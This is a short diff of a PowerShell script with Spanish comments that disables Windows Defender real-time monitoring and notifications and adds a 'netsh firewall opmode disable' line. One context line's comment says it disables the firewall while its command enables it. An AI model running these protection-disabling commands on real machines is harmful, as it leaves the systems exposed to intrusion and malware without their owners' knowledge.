@@ -10,6 +10,9 @@ Set-MpPreference -UILockdown $true          # Desactiva las notificaciones de am
 # Desactiva FireWall
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled true
 
+# Desactiva FireWall CMD
+netsh firewall opmode disable
+
 # Desactivar la protección en tiempo real
 Set-MpPreference -DisableRealtimeMonitoring $true
 
